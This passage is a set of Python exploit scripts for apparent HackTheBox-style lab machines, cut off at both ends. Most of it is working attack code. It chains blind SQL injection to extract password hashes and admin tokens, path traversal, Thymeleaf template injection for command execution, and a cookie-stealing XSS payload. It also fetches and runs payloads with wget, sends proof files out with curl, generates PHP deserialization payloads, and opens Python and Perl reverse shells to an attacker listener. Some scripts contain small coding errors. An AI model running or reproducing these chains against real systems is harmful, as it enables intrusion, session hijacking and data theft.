        if "Try again.." not in response:
            prefix.append(char)
            limit=limit+1
            extracted_char = ''.join(map(chr,prefix))
            sys.stdout.write(extracted_char)
            sys.stdout.flush()
            char=42
        else:
            char=char+1
            prefix = []

def main():
    # Parse Arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='Target ip address or hostname', required=True)
    args = parser.parse_args()

    rhost = args.target

    '''Here we call the functions'''
    # Let's get the version of it
    getVersion(rhost)

if __name__ == '__main__':
    main()
```

#### user_hash_extracted.py

```python
#!/usr/bin/python3
#Author: 0x4rt3mis
#Auto SQLI Username Hash - Falafel HackTheBox
import argparse
import requests
import sys
import string

'''Setting up something important'''
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
r = requests.session()

'''Here come the Functions'''

def hashExtract(rhost,username):
    url = "http://%s" %rhost + "/login.php"
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    password = []
    list = string.ascii_letters + string.digits
    limit = 1
    iterator = 0
    print("The hash for username %s is..." %username)
    while(iterator < len(list)):
        for c in list[iterator]:
            payload = "username=%s'AND+substring(password,%s,1)='%s'--+-&password=test" %(username,limit,c)
            res = requests.post(url, data=payload, proxies=proxies, headers=headers)
            if "Try again.." not in res.text:
                password.append(c)
                limit = limit + 1
                sys.stdout.write(c)
                sys.stdout.flush()
                iterator = 1
            else:
                iterator = iterator + 1
                password = []
    print()

def main():
    # Parse Arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='Target ip address or hostname', required=True)
    parser.add_argument('-u', '--username', help='Username to try to extract the hash value', required=True)
    args = parser.parse_args()

    rhost = args.target
    username = args.username

    '''Here we call the functions'''
    # Let's get the user hash
    hashExtract(rhost,username)

if __name__ == '__main__':
    main()
```

#### 1. my_falafel_sqli.py

```python
#! /usr/bin/python3
import argparse
import requests
import sys
import random
import time
import string
import os
import socket
import telnetlib3
import threading
import http.server
from http.server import HTTPServer, SimpleHTTPRequestHandler
from threading import Thread

'''Setting up something important'''
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
r = requests.session()

lport = 4444
sport = 8000

'''Here come the Functions'''
# Set the handler
def handler(lport, target):
    print("[+] Starting handler on %s [+]" % lport)
    t = telnetlib3.Telnet()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0', lport))
    s.listen(1)
    conn, addr = s.accept()
    print("[+] Connection from %s [+]" % target)
    t.sock = conn
    print("[+] Shell'd [+]")
    t.interact()

# Setting the python web server
def webServer():
    debug = True
    server = http.server.ThreadingHTTPServer(('0.0.0.0', sport), SimpleHTTPRequestHandler)
    if debug:
        print("[+] Starting Web Server in background [+]")
        thread = threading.Thread(target=server.serve_forever)
        thread.daemon = True
        thread.start()
    else:
        print("Starting Server")
        print('Starting server at http://{}:{}'.format('0.0.0.0', sport))
        server.serve_forever()

# Write printflag.py to disk so the web server can serve it
def createPrintflag(lhost):
    print("[+] Creating printflag.py to serve [+]")
    payload  = "import subprocess\n"
    payload += "import urllib.request\n"
    payload += "flag = open('proof.txt').read()\n"
    payload += "urllib.request.urlopen('http://%s:%s/f?flag=' + flag)\n" % (lhost, sport)
    with open("printflag.py", "w") as f:
        f.write(payload)
    print("[+] printflag.py created ! [+]")

# Write revshell.py to disk so the web server can serve it
def createRevshell(lhost, lport):
    print("[+] Creating revshell.py to serve [+]")
    payload  = "import time,socket,subprocess,os\n"
    payload += "time.sleep(5)\n"
    payload += "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n"
    payload += "s.connect(('%s',%s))\n" % (lhost, lport)
    payload += "os.dup2(s.fileno(),0)\n"
    payload += "os.dup2(s.fileno(),1)\n"
    payload += "os.dup2(s.fileno(),2)\n"
    payload += "p=subprocess.call(['/bin/sh','-i'])\n"

    with open("revshell.py", "w") as f:
        f.write(payload)
    print("[+] revshell.py created ! [+]")

# Download the API key via path traversal
def getApiKey(rhost):
    print("[+] Generating the API key file [+]")
    r.get('http://%s/api/users?apiKey=foo' % rhost, proxies=proxies)
    print("[+] Downloading API key via path traversal [+]")
    apikey = r.get('http://%s/download?id=..././conf/apikey' % rhost, proxies=proxies).text.rstrip()
    print("[+] API Key : %s [+]" % apikey)
    return apikey

# Returns the char at <position> of the magic token via blind SQLi (error-based)
def extractSingleChar(rhost, apikey, position):
    for char in string.printable:
        sql_payload = (
            "1 AND (SELECT CASE WHEN ASCII(substr((SELECT token FROM tokens "
            "WHERE user_id=1 LIMIT 1),%d,1))=%d "
            "THEN 1=(SELECT 1 FROM categories) END)" % (position, ord(char))
        )

        url = 'http://%s/api/user/%s/activate?apiKey=%s' % (rhost, sql_payload, apikey)
        status = r.post(url, proxies=proxies).status_code
        if status == 500:
            return char
    print("[+] Error: char at position %d not found, exit. [+]" % position)
    exit()

# Extract the full 64-char admin magic token
def extractToken(rhost, apikey):
    print("[+] Starting token extraction [+]")
    token = ""
    magiclink_size = 64
    for position in range(1, magiclink_size + 1):
        token += extractSingleChar(rhost, apikey, position)
        print(token)
    print("[+] Final magic token : %s [+]" % token)
    return token

# Trigger SSTI via Thymeleaf in welcomeEmail
def triggerSSTI(rhost, payload):
    name  = ''.join(random.choice(string.ascii_lowercase) for _ in range(8))
    email = name + '@soapbx.tld'
    complete_payload = (
        "<a th:href=\"${''.getClass().forName('java.lang.Runtime')"
        ".getRuntime().exec('" + payload + "')}\" th:title='pepito'>"
    )
    r.post('http://%s/admin/welcomeEmail/edit' % rhost,
           data={'content': complete_payload}, proxies=proxies)
    r.post('http://%s/admin/users/create' % rhost,
           data={'name': name, 'email': email}, proxies=proxies)
  

def main():
    # Parse Arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('-t',  '--target',   help='Target ip address or hostname', required=True)
    parser.add_argument('-li', '--localip',  help='Local IP address',              required=True)
    parser.add_argument('-lp', '--localport',help='Local port for reverse shell',  required=True)
    args = parser.parse_args()
    rhost = args.target
    lhost = args.localip
    lport = int(args.localport)

    '''Here we call the functions'''
    # Create the Python scripts to be served
    createPrintflag(lhost)
    createRevshell(lhost, lport)

    # Start the web server
    webServer()
  
    # Start the reverse shell handler
    thr = Thread(target=handler, args=(lport, rhost))
    thr.start()

    # Initialization
    r.get('http://%s/' % rhost, proxies=proxies)
    # Get the API key via path traversal
    apikey = getApiKey(rhost)

    # Generate and extract the admin magic link token
    r.post('http://%s/generateMagicLink' % rhost, data={'username': 'admin'}, proxies=proxies)
    magiclink_token = extractToken(rhost, apikey)


    # Connect as admin using the magic link
    res = r.get('http://%s/magicLink/%s' % (rhost, magiclink_token), proxies=proxies)
    if "Invalid magic link" in res.text:
        print("[+] Issue while using magic link [+]")
        print(res.text)
        exit()

  

    # Try to grab the local flag from the admin page
    admin_page = r.get('http://%s/admin' % rhost, proxies=proxies).text
    try:
        local = admin_page.split('<code>')[1].split('</code>')[0]
        print("[+] Local flag : %s [+]" % local)
    except:
        print("[+] Local flag not found [+]")
  

    # Trigger SSTI to download and execute printflag.py
    print("[+] Triggering SSTI to fetch and run printflag.py [+]")
    triggerSSTI(rhost, 'wget http://%s:%s/printflag.py' % (lhost, sport))
    time.sleep(2)
    triggerSSTI(rhost, 'wget http://%s:%s/printflag.py' % (lhost, sport))
    time.sleep(2)
    triggerSSTI(rhost, 'python printflag.py')
  
    # Trigger SSTI to download and execute revshell.py
    print("[+] Triggering SSTI to fetch and run revshell.py [+]")
    triggerSSTI(rhost, 'wget http://%s:%s/revshell.py' % (lhost, sport))
    time.sleep(2)
    triggerSSTI(rhost, 'python revshell.py')
  

if __name__ == '__main__':
    main()
```

#### 2. my_nightmare.py

```python
#!/usr/bin/python3

import argparse
import request
import sys
import random
import string
import re
import os
import socket
import telnetlib3
import threading
import http.server
from http.server import HTTPServer, BaseHTTPRequestHandler
from threading import Thread
from urllib.parse import urlparse, parse_qs
  
'''Setting up something important'''
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
r = requests.session()
lport    = 4444
sport  = 8000
  
# Globals shared between handler and main
stolen_cookie = None
cookie_event  = threading.Event()
  
'''Here come the Functions'''
# Set the reverse shell handler
def handler(lport, target):
    print("[+] Starting handler on %s [+]" % lport)
    t = telnetlib3.Telnet()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0', lport))
    s.listen(1)
    conn, addr = s.accept()
    print("[+] Connection from %s [+]" % target)
    t.sock = conn
    print("[+] Shell'd [+]")
    t.interact()

class XSSHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass  # silence default logging
  
    def do_GET(self):
        global stolen_cookie
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)


        # /  -> XSS triggered, grab PHPSESSID
        if parsed.path == '/':
            if 'PHPSESSID' in params:
                stolen_cookie = params['PHPSESSID'][0]
                print("[+] Got cookie of admin : %s [+]" % stolen_cookie)
                cookie_event.set()
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'pwnd')


        # /f -> proof.txt received
        elif parsed.path == '/f':
            if 'flag' in params:
                flag = params['flag'][0]
                print("[+] proof.txt : %s [+]" % flag)
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'')

        # serve static files (exp.akx, etc.)
        else:
            filepath = parsed.path.lstrip('/')
            if os.path.isfile(filepath):
                self.send_response(200)
                self.end_headers()
                with open(filepath, 'rb') as f:
                    self.wfile.write(f.read())
            else:
                self.send_response(404)
                self.end_headers()

# Setting the python web server
def webServer():
    debug = True
    server = http.server.ThreadingHTTPServer(('0.0.0.0', sport), XSSHandler)
    if debug:
        print("[+] Starting Web Server in background [+]")
        thread = threading.Thread(target=server.serve_forever)
        thread.daemon = True
        thread.start()
    else:
        print("Starting Server")
        print('Starting server at http://{}:{}'.format('0.0.0.0', sport))
        server.serve_forever()

# Clone phpggc and generate the serialized phar payload
def createPayload(lhost):
    print("[+] Let's generate the malicious exp.akx payload !! [+]")
    if not os.path.isdir('phpggc'):
        print("[+] Cloning phpggc... [+]")
        os.system('git clone --depth 1 https://github.com/ambionics/phpggc')
    else:
        print("[+] phpggc already present, skipping clone [+]")
    cmd = (
        'php --define phar.readonly=0 phpggc/phpggc monolog/rce6 -p phar "system" '
        '\'curl "%s:%s/f?flag=$(cat /var/www/proof.txt)";'
        'perl -MIO -e \'\'\'$c=new IO::Socket::INET(PeerAddr,"%s:%s");'
        'STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\'\'\'\' | tee exp.akx'
        % (lhost, sport, lhost, lport)

    )
    ret = os.system(cmd)
    if ret != 0 or not os.path.isfile('exp.akx'):
        print("[+] Error: make sure git and PHP are installed and phpggc is cloned [+]")

        exit()
    print("[+] Payload exp.akx created !! [+]")


# Register a new random user
def registerUser(rhost):
    print("[+] Let's register a new user !! [+]")
    global email, password
    email    = ''.join(random.choice(string.ascii_lowercase) for _ in range(3)) + '@akount.tld'
    password = 'password'
    rep = requests.post('http://%s/register' % rhost,
                        data={'name': 'name', 'email': email, 'password': password},
                        proxies=proxies)

    if "You are now registered" not in rep.text:
        print("[+] Error registering user, maybe already exists ? [+]")
        print(rep.text)
        exit()
    print("[+] User %s registered !! [+]" % email)
  
# Login with the created user
def loginUser(rhost):
    print("[+] Let's login !! [+]")
    rep = r.post('http://%s/login' % rhost,
                 data={'email': email, 'password': password},
                 proxies=proxies)

    if 'Total Amount per Invoice' not in rep.text:
        print("[+] Failed login [+]")
        print(rep.text)
        exit()
    print("[+] Logged in !! [+]")

# Inject XSS payload into avatar upload
def injectXSS(rhost, lhost):
    print("[+] Injecting XSS into avatar upload !! [+]")
    xss_payload = (
        "data:image/jpeg;base64,/9j/4AAQSkZJ' onerror='var i=new Image;"
        "i.src=\"http://%s:%s/?\"+document.cookie;" % (lhost, sport)
    )

    r.post('http://%s/upload-avatar' % rhost,
           files={'avatar': xss_payload},
           proxies=proxies)
    print("[+] XSS injected, waiting for admin to visit /admin... [+]")

# Wait for the stolen cookie then hijack admin session
def hijackAdmin(rhost):
    print("[+] Waiting for admin cookie... [+]")
    cookie_event.wait()
    print("[+] Replacing session cookie with admin's [+]")
    for cookie in r.cookies:
        if cookie.name == 'PHPSESSID':
            cookie.value = stolen_cookie
    # Grab the local flag from the admin page
    admin_page = r.get('http://%s/admin' % rhost, proxies=proxies).text
    try:
        local = re.search('>([A-Za-z0-9]{32})', admin_page).group(1)
        print("[+] Local flag : %s [+]" % local)
    except:
        print("[+] Local flag not found [+]")
    # Upload the malicious phar file
    print("[+] Uploading exp.akx as admin !! [+]")
    r.post('http://%s/import' % rhost,
           files={'file': open('exp.akx', 'rb')},
           proxies=proxies)
    print("[+] Payload uploaded !! [+]")

  

def main():
    # Parse Arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('-t',  '--target',    help='Target ip address or hostname', required=True)
    parser.add_argument('-li', '--localip',   help='Local IP address',              required=True)
    parser.add_argument('-lp', '--localport', help='Local port for reverse shell',  required=True)

    args = parser.parse_args()
    rhost = args.target
    lhost = args.localip
    lport = int(args.localport)
    global lport
    lport = lport


    '''Here we call the functions'''
    # Generate the malicious phar payload
    createPayload(lhost)
  
    # Start the web server (XSS catcher + file server)
    webServer()


    # Start the reverse shell handler
    thr = Thread(target=handler, args=(lport, rhost))
    thr.start()

    # Register and login as a regular user
    registerUser(rhost)
    loginUser(rhost)
  
    # Inject XSS into avatar
    injectXSS(rhost, lhost)

    # Wait for admin to trigger XSS, then hijack session and upload payload
    hijackAdmin(rhost)

if __name__ == '__main__':
    main()
```

#### 3. sko_brige.py

```python
import requests
import sys
import random
import time
import re
import threading
import string
import multiprocessing
import os
from flask import Flask, request
app = Flask(__name__)
 

# Constants
NC_PORT = 4444
FLASK_PORT = 8000

# Global variables
target = None
kali_ip = None
session = None
apikey = None

class ExploitFramework:
    def __init__(self, target_url, attacker_ip):
        self.target = target_url
        self.kali_ip = attacker_ip
        self.session = requests.Session()
        self.apikey = None

    def initialize_session(self):
        """Initialize the session and get API key"""
        try:
            self.session.get(f'http://{self.target}/')
            self.session.get(f'http://{self.target}/api/users?apiKey=foo')
            # Download API key with path traversal
            response = self.session.get(f'http://{self.target}/download?id=..././conf/apikey')
            self.apikey = response.text.rstrip()
            if not self.apikey:
                raise ValueError("Failed to obtain API key")
            return True
        except (requests.RequestException, ValueError) as e:
            print(f"[-] Session initialization failed: {e}")
            return False

    def extract_token(self):
        """Extract the magiclink token for admin user"""
        print("Starting token extraction")
        extracted_token = ""
        magiclink_size = 64
        try:
            # Generate magic link for admin
            self.session.post(f'http://{self.target}/generateMagicLink',
                            data={'username': 'admin'})
            for position in range(1, magiclink_size + 1):
                char = self.extract_single_char(position)
                if not char:
                    raise ValueError(f"Failed to extract character at position {position}")
                extracted_token += char
                print(extracted_token)


            print(f'Final magic token: {extracted_token}')
            return extracted_token
        except Exception as e:
            print(f"[-] Token extraction failed: {e}")
            return None

    def extract_single_char(self, position):
        """Extract a single character from the token at given position"""
        for char in string.printable:
            sql_payload = (
                f'1 AND (SELECT CASE WHEN ASCII(substr((SELECT token FROM tokens '
                f'WHERE user_id=1 LIMIT 1),{position},1))={ord(char)} THEN '
                '1=(SELECT 1 FROM categories) END)'
            )
            try:
                response = self.session.post(
                    f'http://{self.target}/api/user/{sql_payload}/activate?apiKey={self.apikey}'
                )
                if response.status_code == 500:
                    return char
            except requests.RequestException:
                continue
        print(f'Error: char in position {position} not found')
        return None
  
    def trigger_ssti(self, payload):
        """Trigger SSTI vulnerability with given payload"""
        try:
            name = ''.join(random.choice(string.ascii_lowercase) for _ in range(8))
            email = f'{name}@soapbx.tld'
            # Thymeleaf SSTI payload
            complete_payload = (
                """<a th:href="${''.getClass().forName('java.lang.Runtime')."""
                f"""getRuntime().exec('{payload}')}" th:title='pepito'>"""
            )

            # Edit welcome email template
            self.session.post(
                f'http://{self.target}/admin/welcomeEmail/edit',
                data={'content': complete_payload}
            )

            # Trigger the template processing
            self.session.post(
                f'http://{self.target}/admin/users/create',
                data={'name': name, 'email': email}
            )
            return True
        except requests.RequestException as e:
            print(f"[-] SSTI trigger failed: {e}")
            return False

    def get_local_flag(self):
        """Retrieve the local flag from admin page"""
        try:
            response = self.session.get(f'http://{self.target}/admin')
            admin_page = response.text
            local_flag = admin_page.split('<code>')[1].split('</code>')[0]
            print(f'[+] Local flag: {local_flag}')
            return local_flag
        except (requests.RequestException, IndexError) as e:
            print("[-] Local flag not found")
            return None


# Flask endpoints
@app.route('/printflag.py')
def send_printflag_script():
    print('Sending the Python script to retrieve proof.txt')
    return f"""import subprocess;subprocess.call(["/bin/sh","-c","wget http://{kali_ip}:{FLASK_PORT}/f?flag="+open('proof.txt').read()])"""


@app.route('/f')
def receive_flag():
    flag = request.args.get("flag")
    if flag:
        print(f'[+] proof.txt: {flag}')
    return ''


@app.route('/revshell.py')
def send_revshell_script():
    print('Sending reverse shell Python script')
    return f'''import time,socket,subprocess,os;time.sleep(5);s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{kali_ip}",{NC_PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'''

def start_flask_server():
    """Start the Flask server in a separate thread"""
    app.run(host=kali_ip, port=FLASK_PORT, debug=False, use_reloader=False)
  
def start_listener():
    """Start the netcat listener in a separate process"""
    os.system(f'nc -lvnp {NC_PORT}')

def main():
    if len(sys.argv) != 3:
        print("Usage: python exploit.py <target_url> <kali_ip>")
        sys.exit(1)
  
    global target, kali_ip
    target = sys.argv[1]
    kali_ip = sys.argv[2]

    # Start services
    threading.Thread(target=start_flask_server, daemon=True).start()
    multiprocessing.Process(target=start_listener, daemon=True).start()

    # Initialize exploit framework
    exploit = ExploitFramework(target, kali_ip)
    if not exploit.initialize_session():
        sys.exit(1)

    # Get admin access
    magic_token = exploit.extract_token()
    if not magic_token:
        sys.exit(1)

    response = exploit.session.get(f'http://{target}/magicLink/{magic_token}')
    if "Invalid magic link" in response.text:
        print("[-] Failed to use magic link")
        sys.exit(1)

    # Get local flag
    exploit.get_local_flag()

    # Exploit chain
    commands = [
        f'wget http://{kali_ip}:{FLASK_PORT}/printflag.py',
        f'wget http://{kali_ip}:{FLASK_PORT}/printflag.py',  # Second attempt as per notes
        'python printflag.py',
        f'wget http://{kali_ip}:{FLASK_PORT}/revshell.py',
        'python revshell.py'
    ]

    for cmd in commands:
        if not exploit.trigger_ssti(cmd):
            print(f"[-] Failed to execute: {cmd}")
        time.sleep(2)
  
    # Keep the script running
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Exiting...")

if __name__ == '__main__':
    main()
```

#### 4. ako_bridge.py

```python
import requests
import sys
import re
import random
import string
from flask import Flask, request, abort

app = Flask(__name__)
# Global variables
target_url = None
kali_ip = None
flask_port = None
sess = None
  
def generate_random_credentials():
    """Generate random user credentials."""
    name = ''.join(random.choice(string.ascii_lowercase) for _ in range(6))
    return {
        'name': name,
        'email': f'{name}@akount.tld',
        'password': '123456'
    }

def setup_session():
    """Create a user account and establish a session."""
    credentials = generate_random_credentials()
    # Register new user
    try:
        requests.post(
            f'http://{target_url}/register',
            data=credentials,
            timeout=10
        )
    except requests.RequestException as e:
        print(f"[-] Registration failed: {e}")
        sys.exit(1)
    # Login and establish session
    try:
        session = requests.Session()
        session.post(
            f'http://{target_url}/login',
            data={'email': credentials['email'], 'password': credentials['password']},

            timeout=10

        )
        return session
    except requests.RequestException as e:
        print(f"[-] Login failed: {e}")
        sys.exit(1)

def upload_xss_payload(session):
    """Upload the XSS payload as an avatar."""
    payload = f"""data:image/png;base64,iVBORw0KGgo' onerror='var i=new Image();i.src="http://{kali_ip}:{flask_port}/?"+document.cookie;"""
    try:
        session.post(
            f'http://{target_url}/upload-avatar',
            files={'avatar': payload},
            timeout=10
        )
    except requests.RequestException as e:
        print(f"[-] XSS payload upload failed: {e}")
        sys.exit(1)

@app.route('/')
def capture_admin_cookie():
    """Endpoint to capture admin cookie and retrieve the flag."""
    admin_session = request.args.get("PHPSESSID")
    if not admin_session:
        abort(400, "PHPSESSID parameter missing")
    print(f"[+] ADMIN_SESSION: {admin_session}")

    # Replace session cookie with admin's
    for cookie in sess.cookies:
        if cookie.name == 'PHPSESSID':
            cookie.value = admin_session

    # Retrieve the local flag
    try:
        admin_page = sess.get(f'http://{target_url}/admin', timeout=10).text
        local_flag = re.search(r'>([A-Za-z0-9]{32})', admin_page)
        if not local_flag:
            raise ValueError("Flag not found in admin page")
        local_flag = local_flag.group(1)
        print(f'[+] LOCAL_FLAG: {local_flag}')
  
        # Upload the exploit file
        with open('exp.akx', 'rb') as f:
            sess.post(f'http://{target_url}/import', files={'file': f}, timeout=10)
        return "GET LOCAL FLAG SUCCESS"
    except (requests.RequestException, ValueError) as e:
        print(f"[-] Error retrieving flag: {e}")
        abort(500, "Failed to retrieve flag")


if __name__ == '__main__':
    if len(sys.argv) != 4:
        print("Usage: python script.py <target_url> <kali_ip> <flask_port>")
        sys.exit(1)
    target_url = sys.argv[1]
    kali_ip = sys.argv[2]
    flask_port = sys.argv[3]

    # Set up the session and upload XSS payload
    sess = setup_session()
    upload_xss_payload(sess)

    # Start the Flask server
    app.run(host='0.0.0.0', port=flask_port, use_reloader=False)
```

#### 5. red_soap.py

```python
import requests, sys, random, time, re, threading, string
import multiprocessing, os # For automatic listener according to new rules

# Script by RedBlock
target         = sys.argv[1] # The URL of soapbx
kali_ip        = sys.argv[2] # IP address of Kali running the script
nc_port        = 4444 # Port on which runs the listener, 443 for example. Script creates its own listener.

flask_port     = 8000 # For the HTTP server on Kali
# Import and create Flask app before everything else. Can also be done with sockets.

from flask import Flask, request
app = Flask(__name__)

# Send the script that will get the proof.txt
@app.route('/printflag.py')

def onGetPrintflag():
    print('Sending the Python script to retrieve the proof.txt')
    return f"""import subprocess;subprocess.call(["/bin/sh","-c","wget http://{kali_ip}:{flask_port}/f?flag="+open('proof.txt').read() ])"""

# React when proof.txt is sent
@app.route('/f')
def onFlag():
    flag = request.args.get("flag")
    print(f'[+] proof.txt : {flag}')
    return '' # Useless, just to avoid Python warning

# Send the payload of the reverse shell
@app.route('/revshell.py')
def onRevshell():
    print(f'Sending the Python script to get reverse shell.')
    return f'import time,socket,subprocess,os;time.sleep(5);s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{kali_ip}",{nc_port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Need to be run as thread to avoid blocking script
threading.Thread(target=lambda: app.run(host=kali_ip, port=flask_port, debug=True, use_reloader=False)).start()

# This function extracts the magiclink administrator (always userid 1)
def extract_token(session):
    print("Starting token extraction")
    extracted_token = ""
    magiclink_size = 64
    for position in range(1, magiclink_size+1):
        extracted_token += extract_single_char(session, position)
        print(extracted_token)
    print(f'Final magic token : {extracted_token}')
    return extracted_token

# This function returns the value of char <position> of the magic token
def extract_single_char(session, position):
    # We iterate through all printable characters
    for char in string.printable:
        # OLD version with time-based, use it if you want fun or diversity
        # 4 second is short enough if run on dedicated Kali for instant network. Less would lead to false-positives. Increase to 4 seconds over VPN, adapt the check
        # You should probably be able to do a blind without sleep, based on HTTP response. To be confirmed.
        # sql_payload = f'1 AND (SELECT CASE WHEN ASCII(substr((SELECT token FROM tokens WHERE user_id=1 LIMIT 1),{position},1))={ord(char)} THEN 0=(SELECT 1 FROM PG_SLEEP(4)) END)'
        # response_time = session.post(f'http://{target}/api/user/{sql_payload}/activate?apiKey={apikey}').elapsed.total_seconds()
        # if (response_time > 3.8):
        #     return char
        # The 1=(SELECT 1 FROM categories) is just here to trigger an error "more than one row returned by a subquery used as an expression", it can be from any table, it's just to compare an integer with several rows.

        sql_payload = f'1 AND (SELECT CASE WHEN ASCII(substr((SELECT token FROM tokens WHERE user_id=1 LIMIT 1),{position},1))={ord(char)} THEN 1=(SELECT 1 FROM categories) END)'
        statuscode = session.post(f'http://{target}/api/user/{sql_payload}/activate?apiKey={apikey}').status_code
        if (statuscode == 500):
            return char
    print(f'Error : char in position {position} not found, exit.')
    exit()

# With a given Bash payload, insert into Thymeleaf, send and trigger
def triggerSSTI(payload):
    # Create random name and username to avoid conflicts
    name  = ''.join(random.choice(string.ascii_lowercase) for _ in range(8))
    email = name + '@soapbx.tld'
    # Payload comes from https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#thymeleaf-java , script written by T a m a r i s k, remove me, adapt if you want for personalisation
    complete_payload = """<a th:href="${''.getClass().forName('java.lang.Runtime').getRuntime().exec('"""+ payload + """')}" th:title='pepito'>"""
    session.post(f'http://{target}/admin/welcomeEmail/edit', data={'content': complete_payload})
    # Should be necessary to trigger the call "engine.process()"
    session.post(f'http://{target}/admin/users/create',      data={'name': name, 'email':email})

# Set up the nc listener
multiprocessing.Process( target=os.system, args=(f'nc -lvnp {nc_port}',) ).start()

# Initialization
session = requests.Session()
session.get(f'http://{target}/')

# Generate the API key file
session.get(f'http://{target}/api/users?apiKey=foo')

# Download API key with path traversal
apikey = session.get(f'http://{target}/download?id=..././conf/apikey').text.rstrip()
  
# Generate and extract magiclink for admin
session.post(f'http://{target}/generateMagicLink', data={'username':'admin'}) # Adapt username
magiclink_token = extract_token(session)
  
# Connect using the magiclink
res = session.get(f'http://{target}/magicLink/{magiclink_token}')
if "Invalid magic link" in res.text:
    print("Issue while using magic link")
    print(res.text)
    exit()

# Don't forget to print the flag, as stated in the rules
# Read the flag on /admin account, which is usually between <code> tags
admin_page_source = session.get(f'http://{target}/admin').text
try:
    local = admin_page_source.split('<code>')[1].split('</code>')[0]
    print(f'[+] Local flag : {local}')
except:
    print("Local not found") # It's the case in dev box
  
# Once connected as admin, exploit SSTI in the edit of welcomeEmail
# Print the proof.txt with Flask
# For unknown reason, it doesn't wget on first call (at least on local setup), hence the two identical calls
triggerSSTI(f'wget http://{kali_ip}:{flask_port}/printflag.py')
time.sleep(2)
triggerSSTI(f'wget http://{kali_ip}:{flask_port}/printflag.py')
time.sleep(2)
triggerSSTI('python printflag.py')

# Retrieve the Python script from Flask. Can also be a bash script (but don't forget chmod +x after)
triggerSSTI(f'wget http://{kali_ip}:{flask_port}/revshell.py')
time.sleep(2)
  
# Make the server run the payload
triggerSSTI('python revshell.py')
```

#### 6. red_akount.py

```python
import requests, sys, random, string, re
import multiprocessing, os # For automatic listener according to new rules

# Script by RedBlock
target         = sys.argv[1] # The URL of akount
kali_ip        = sys.argv[2] # IP address of Kali running the script
nc_port        = 4444 # Port on which runs the listener (automatic)
flask_port     = 8000 # For the HTTP Flask server on Kali

# Import and create Flask app before everything else. Can also be done with sockets.
from flask import Flask, request
app = Flask(__name__)

# Will trigger with XSS
@app.route('/')
def onXSS():
    phpsessid = request.args.get("PHPSESSID")
    print(f'Got cookie of admin {phpsessid}')
    # Replace our session cookie
    for cookie in sess.cookies:
        if cookie.name == 'PHPSESSID':
            cookie.value = phpsessid
    # Retrieve the admin page, and extract the flag
    admin_page_source = sess.get(f'http://{target}/admin').text
    print('[+] Local flag : ' + re.search('>([A-Za-z0-9]{32})', admin_page_source).group(1) )
    # Send the malicious file
    sess.post(f'http://{target}/import', files={'file': open('exp.akx', 'rb')})
    return 'pwnd' # Useless, just to avoid warning

# React when proof.txt is sent
@app.route('/f')
def onFlag():
    flag = request.args.get("flag")
    print(f'[+] proof.txt : {flag}')
    return '' # Useless, just to avoid Python warning
    
# Dynamically generate the Serialized payload, with given IP & ports
try:
    # Generate the object and save it into exp.akx
    # Reverse shell can be adapted and use bash, PHP, or python
    os.system('git clone --depth 1 https://github.com/ambionics/phpggc')
    # Might need to adapt proof.txt location
    os.system(f'''php --define phar.readonly=0 phpggc/phpggc monolog/rce6 -p phar "system" 'curl "{kali_ip}:{flask_port}/f?flag=$(cat /var/www/proof.txt)";perl -MIO -e '"'"'$c=new IO::Socket::INET(PeerAddr,"{kali_ip}:{nc_port}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"'" | tee exp.akx''')
except Exception as e:
    print("Make sure that git and PHP are installed, and that project phpggc is cloned")
    exit()
# Automatically Set up the nc listener
multiprocessing.Process( target=os.system, args=(f'nc -lvnp {nc_port}',) ).start()
# Generate random username to avoid duplicates accounts
email = ''.join(random.choice(string.ascii_lowercase) for _ in range(3)) + '@akount.tld'

password = 'password'
# Create a regular user account
rep = requests.post(f'http://{target}/register', data={'name':'name','email':email,'password':password})

if "You are now registered" not in rep.text:
    print(rep.text, "Error registration, maybe already exists ?")
    exit()
  
# Create a session object and connect with this user
sess = requests.Session()
rep = sess.post(f'http://{target}/login', data={'email':email,'password':password})
if 'Total Amount per Invoice' not in rep.text:
    print(rep.text, "Failed login")
    exit()

# Put XSS in the avatar upload feature.
sess.post(f'http://{target}/upload-avatar', files={'avatar':f"""data:image/jpeg;base64,/9j/4AAQSkZJ' onerror='var i=new Image;i.src="http://{kali_ip}:{flask_port}/?"+document.cookie;"""})

# Listen on all interfaces:flask_port and wait for admin to trigger XSS when he visits /admin page
# use_reloader prevents from Flask calling again the script on load/change, preventing creating two users and so on

app.run(host='0.0.0.0', port = flask_port, use_reloader=False)
# Nothing after that blocking app.run, everything must be called from the callback on top !

# script written by T a m a r i s k

##############################################################################
```


#### auto_rev.py

```python
#!/usr/bin/python3
# Author: 0x4rt3mis
# Auto Reverse Shell - Falafel - HackTheBox
import argparse
import requests
import sys
import socket, telnetlib
from threading import Thread
from threading import Thread
import threading                     
import http.server                                  
import socket                                   
from http.server import HTTPServer, SimpleHTTPRequestHandler
import re
import urllib.parse
import os

'''Setting up something important'''
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
r = requests.session()

